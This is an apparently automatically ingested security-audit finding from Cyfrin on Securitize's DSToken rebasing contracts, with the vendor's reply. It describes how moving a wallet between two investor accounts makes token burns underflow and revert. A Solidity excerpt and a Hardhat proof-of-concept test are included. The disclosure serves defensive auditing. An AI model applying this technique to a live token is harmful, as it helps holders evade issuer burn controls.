---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2025-10-10-cyfrin-securitize-dstoken-rebasing-v2-1-3-12
ingested_at: '2026-08-30T10:05:51Z'
protocol_category: []
published_at: '2025-10-10T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md
tags:
- firm:cyfrin
- report:2025-10-10-cyfrin-securitize-dstoken-rebasing-v2-1
title: Possible to escape burning of DSTokens by removing the wallet from the current
  investor and adding it as the wallet of another investor
vuln_class: []
---

# Possible to escape burning of DSTokens by removing the wallet from the current investor and adding it as the wallet of another investor

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-10-cyfrin-securitize-dstoken-rebasing-v2.1.md)_

---

**Description:** Investors owning multiple investor accounts can split the `balanceOfInvestor()` and `balanceOf()` in their accounts by removing the wallet from the investor when issuing tokens and then using another investor account to add that wallet as its own.
- This makes that the `balanceOfInvestor()` for the issued tokens to remain accounted for the investor1, and the `balanceOf()` pointing to the actual wallet.

Putting the contract in that state allows investors to escape burning operations because the burning execution would result in underflow when attempting to burn the `investorsBalance` of the current investor that owns the wallet from where tokens should be burnt.
```solidity
    function burn(
        ...
    ) public returns (uint256) {
        ...
        //@audit-info => here will occur the underflow because the current investor owning the `who` wallet has not the investorBalance required to decrement `sharesToBurn` from it
        updateInvestorBalance(
            _tokenData,
            IDSRegistryService(_services[REGISTRY_SERVICE]),
            _who,
            sharesToBurn,
            CommonUtils.IncDec.Decrease
        );

        ...
    }
```

**Impact:** Investors can escape burning of their DSTokens.

**Proof of Concept:** Add the next PoC in `dstoken-regulated.test.ts`

```js
   it.only('escaping burning by forcing an underflow', async function () {
        const [owner, investor1, investor2, secondWalletInvestor1] = await hre.ethers.getSigners();
        const { registryService, dsToken } = await loadFixture(deployDSTokenRegulated);

        // Setup: Register two investors
        await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1, INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_1);
        await registryService.registerInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_2, INVESTORS.INVESTOR_ID.INVESTOR_COLLISION_HASH_2);

        // Setup: Add wallets to investors
        await registryService.addWallet(investor1, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);
        await registryService.addWallet(investor2, INVESTORS.INVESTOR_ID.INVESTOR_ID_2);

        const registryServiceFromInvestor1 = await registryService.connect(investor1);
        await registryServiceFromInvestor1.addWalletByInvestor(secondWalletInvestor1.address);

        // Setup: Issue tokens to secondWalletInvestor1
        const issueTokens = 500;
        await dsToken.setCap(1000);
        await dsToken.issueTokens(secondWalletInvestor1.address, issueTokens);

        expect(await dsToken.balanceOf(secondWalletInvestor1.address)).to.equal(issueTokens);

        // secondWalletInvestor1 is removed as a wallet of investor1
        await registryService.removeWallet(secondWalletInvestor1.address, INVESTORS.INVESTOR_ID.INVESTOR_ID_1);

        // investor2 adds secondWalletInvestor1 wallet as its own
        const registryServiceFromInvestor2 = await registryService.connect(investor2);
        await registryServiceFromInvestor2.addWalletByInvestor(secondWalletInvestor1.address);

        //@audit-info => attempting to burn tokens from secondWalletInvestor1 fails because of underflow when reducing the investorsBalance of the investor2
        //@audit-info => reverts because of underflow
        await expect(dsToken.burn(secondWalletInvestor1.address, issueTokens, "")).to.be.reverted;

        expect(await dsToken.balanceOfInvestor(INVESTORS.INVESTOR_ID.INVESTOR_ID_1)).to.equal(issueTokens);
        expect(await dsToken.balanceOf(secondWalletInvestor1.address)).to.equal(issueTokens);
    });
```

**Securitize:** Acknowledged but in reality this is not possible since the same entity can't control multiple investor accounts; we prevent this during the KYC/onboarding process.
